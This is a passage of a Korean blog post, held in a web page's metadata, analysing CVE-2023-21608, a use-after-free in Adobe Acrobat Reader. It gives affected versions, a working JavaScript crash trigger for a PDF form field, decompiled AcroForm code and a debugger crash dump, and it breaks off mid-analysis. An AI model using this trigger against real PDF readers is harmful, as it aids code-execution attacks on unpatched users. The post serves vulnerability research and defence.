

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;h1 id=&#34;Init&#34;&gt;&lt;a href=&#34;#Init&#34; class=&#34;headerlink&#34; title=&#34;Init&#34;&gt;&lt;/a&gt;Init&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC624;&amp;#xB298;&amp;#xC740; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC81C;&amp;#xBAA9;&amp;#xCC98;&amp;#xB7FC; CVE-2023-21608&amp;#xC758; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xB2E4;&amp;#xB8F0; &amp;#xAC83;&amp;#xC774;&amp;#xACE0; &amp;#xD558;&amp;#xB8E8;&amp;#xD55C;&amp;#xC904;&amp;#xC5D0; &amp;#xC880; &amp;#xBD80;&amp;#xC871;&amp;#xD568;&amp;#xC744; &amp;#xB290;&amp;#xB07C;&amp;#xC168;&amp;#xC744; &amp;#xBD84;&amp;#xB4E4;&amp;#xC744; &amp;#xC704;&amp;#xD55C; &amp;#xD558;&amp;#xB8E8; &amp;#xD55C; &amp;#xBB38;&amp;#xC11C;&amp;#xCBE4; &amp;#xB418;&amp;#xB294; &amp;#xBD84;&amp;#xB7C9;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/8yf1gt.gif&#34; alt=&#34;8yf1gt.gif&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xC815;&amp;#xBCF4;&#34;&gt;&lt;a href=&#34;#1-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xC815;&amp;#xBCF4;&#34; class=&#34;headerlink&#34; title=&#34;1. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC815;&amp;#xBCF4;&#34;&gt;&lt;/a&gt;1. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC815;&amp;#xBCF4;&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&#34;Description&#34;&gt;&lt;a href=&#34;#Description&#34; class=&#34;headerlink&#34; title=&#34;Description&#34;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;CVE-2023-21608&amp;#xC740; Adobe &amp;#xC0AC;&amp;#xC758; PDF &amp;#xBB38;&amp;#xC11C; &amp;#xD3B8;&amp;#xC9D1;, &amp;#xBCC0;&amp;#xD658; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC778; Acrobat&amp;#xACFC; PDF &amp;#xBDF0;&amp;#xC5B4;&amp;#xC778; Acrobat Reader &amp;#xC81C;&amp;#xD488;&amp;#xAD70;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD55C; Use-After-Free &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xB4E4;&amp;#xC5D0;&amp;#xC11C; &amp;#xC545;&amp;#xC131; PDF &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xC5F4;&amp;#xBA74; &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0; &amp;#xD3EC;&amp;#xD568;&amp;#xB41C; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xC5EC; Remote Code Execution&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Affected-Product-amp-Version-Information&#34;&gt;&lt;a href=&#34;#Affected-Product-amp-Version-Information&#34; class=&#34;headerlink&#34; title=&#34;Affected Product &amp;amp; Version Information&#34;&gt;&lt;/a&gt;Affected Product &amp;amp; Version Information&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Adobe Acrobat 2020&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 20.005.30418&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adobe Acrobat Reader 2020&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 20.005.30418&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Acrobat DC&lt;ul&gt;
&lt;li&gt;version &amp;#x2264; 22.003.20282&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Acrobat Reader DC&lt;ul&gt;
&lt;li&gt;version &amp;#x2264;  22.003.20282&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC81C; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC704;&amp;#xD574; Adobe Acrobat Reader DC x86&amp;#xC758; 2022.001.20085 &amp;#xBC84;&amp;#xC804;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;2-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;a href=&#34;#2-&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;-&amp;#xBD84;&amp;#xC11D;&#34; class=&#34;headerlink&#34; title=&#34;2. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;/a&gt;2. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D;&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xB294; Use-After-Free&amp;#xB97C; &amp;#xC720;&amp;#xBC1C;&amp;#xD558;&amp;#xC5EC; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294;&amp;#xB370; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; Javascript &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; testField = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.getField(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;testField&amp;quot;&lt;/span&gt;);

testField.richText = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;

testField.setAction(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Calculate&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;calculateCallback()&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.resetForm(); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (e) {}

&lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.resetForm(); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (e) {}  &lt;span class=&#34;hljs-comment&#34;&gt;// bug is triggered during this resetForm call&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;calculateCallback&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{

  event.__defineGetter__(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;target&amp;quot;&lt;/span&gt;, getterFunc);

  event.richValue = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;

}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;getterFunc&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{

  &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; { &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.defineProperty(testField, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;textFont&amp;quot;&lt;/span&gt;, { &lt;span class=&#34;hljs-attr&#34;&gt;value&lt;/span&gt;: &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt; }); } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt;(e) { }

}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB41C; PDF &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &lt;code&gt;testField&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; text field&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;5 0 obj
&amp;lt;&amp;lt;
&lt;span class=&#34;hljs-built_in&#34;&gt;/Type &lt;/span&gt;/Annot
/Subtype /Widget
/T (testField)
/FT /Tx
/Rect [0 0 0 0]
&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB41C; &amp;#xBB38;&amp;#xC11C;&amp;#xB97C; &amp;#xC5F4;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &amp;#xC704;&amp;#xC758; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; (1)&amp;#xBB38;&amp;#xC11C; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &lt;code&gt;doc&lt;/code&gt;&amp;#xC758; Instance&amp;#xC778; &lt;code&gt;this&lt;/code&gt;&amp;#xC758; &lt;code&gt;getField&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;testField&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0; (2)&lt;code&gt;setAction&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;testField&lt;/code&gt;&amp;#xC758;  &lt;code&gt;Calculate&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xB85C; &lt;code&gt;calculateCallback&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC9C0;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; &amp;#xC904;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; (3)&lt;code&gt;this.resetForm()&lt;/code&gt;&amp;#xC740; &lt;code&gt;Calculate&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xAC00; &amp;#xC815;&amp;#xC758;&amp;#xB41C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD544;&amp;#xB4DC; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &lt;code&gt;calculate&lt;/code&gt; &amp;#xC774;&amp;#xBCA4;&amp;#xD2B8;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xCF1C; &amp;#xD578;&amp;#xB4E4;&amp;#xB7EC;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB3C4;&amp;#xB85D; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;testField&lt;/code&gt;&amp;#xC758; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; (4)&lt;code&gt;calculateCallback&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC774; &amp;#xD568;&amp;#xC218; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;event&lt;/code&gt;&amp;#xC758; &lt;code&gt;target&lt;/code&gt; &amp;#xC18D;&amp;#xC131;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; getter&amp;#xB97C; &lt;code&gt;getterFunc&lt;/code&gt;&amp;#xB85C; &amp;#xC7AC;&amp;#xC815;&amp;#xC758;&amp;#xD558;&amp;#xACE0; &lt;code&gt;richiValue&lt;/code&gt; &amp;#xC18D;&amp;#xC131;&amp;#xC5D0; &lt;code&gt;this&lt;/code&gt;&amp;#xB97C; &amp;#xB300;&amp;#xC785;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;richValue&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xB420; &amp;#xAC12;&amp;#xC778; &lt;code&gt;this&lt;/code&gt; (&lt;code&gt;doc&lt;/code&gt;)&amp;#xC758; &amp;#xBAA8;&amp;#xB4E0; &amp;#xC18D;&amp;#xC131;&amp;#xACFC; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xAC00; &lt;code&gt;EScript!ESObjectEnum&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC7AC;&amp;#xADC0;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC5F4;&amp;#xAC70;&amp;#xB418;&amp;#xAE30; &amp;#xC2DC;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;event.target&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5B4; &lt;code&gt;getterFunc&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &lt;code&gt;testField.textFont&lt;/code&gt;&amp;#xAC00; &lt;code&gt;this&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xB00C;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &lt;code&gt;this.resetForm()&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB3D9;&amp;#xC791;&amp;#xC774; &amp;#xBC18;&amp;#xBCF5;&amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;this&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &lt;code&gt;testField.textFont&lt;/code&gt;&amp;#xAC00; &amp;#xC218;&amp;#xC815; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;(non-configurable)&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;getterFunc&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC1C;&amp;#xC0DD;&amp;#xD55C; &amp;#xC608;&amp;#xC678;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;event.richValue&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;AcroForm!GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC5F4;&amp;#xAC70; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &lt;code&gt;CAgg&lt;/code&gt;&amp;#xC640; &lt;code&gt;map&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;GetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *arg0, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
...
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    LOBYTE(v16) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    sub_2085ECA0(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;EventRichValueInProgress&amp;quot;&lt;/span&gt;);
    sub_20AAE7D6(arg0, v16, v17, v18, v19, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a1
      &amp;amp;&amp;amp; (v9 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_21473CB8 + &lt;span class=&#34;hljs-number&#34;&gt;180&lt;/span&gt;),
          v10 = __guard_check_icall_fptr(a1),
          v9(v10)) )
    {
      PointerType = sub_20A4AD65(a1, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
        PointerType = CAggToESVal(PointerType, v12, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)a3, PointerType);&lt;span class=&#34;hljs-comment&#34;&gt;// Free All CAgg &amp;amp; map&lt;/span&gt;
    }
...
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCF4;&amp;#xBA74; &amp;#xB531;&amp;#xD788; &amp;#xD070; &amp;#xBB38;&amp;#xC81C;&amp;#xB294; &amp;#xC5C6;&amp;#xC5B4; &amp;#xBCF4;&amp;#xC774;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC758; &amp;#xD574;&amp;#xC81C;&amp;#xAC00; &amp;#xC5F4;&amp;#xAC70;&amp;#xAC00; &amp;#xC544;&amp;#xC9C1; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC774;&amp;#xD6C4; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=04f6a0f0 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000000 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=420fefd0 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=44e1cff8 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=6921ef50 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=420fefd0
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6c556b99 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=04f6a0d0 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=04f6a0fc &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00010206
AcroForm!CAgg::operator[](unsigned short)+0xe:
6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;420fefd0&lt;/span&gt;=????????&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;page-heap&amp;#xC744; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; Use-After-Free&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;AcroForm!CAgg::operator[]&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF4;&amp;#xBA74; if&amp;#xBB38; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;this-&amp;gt;type&lt;/code&gt; &amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xB54C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;this&lt;/code&gt;&amp;#xAC00; UAF&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __userpurge CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]@&amp;lt;eax&amp;gt;(CAgg *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;@&amp;lt;ecx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; (*a2)[&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;]@&amp;lt;ebx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *someID)
{
  ...

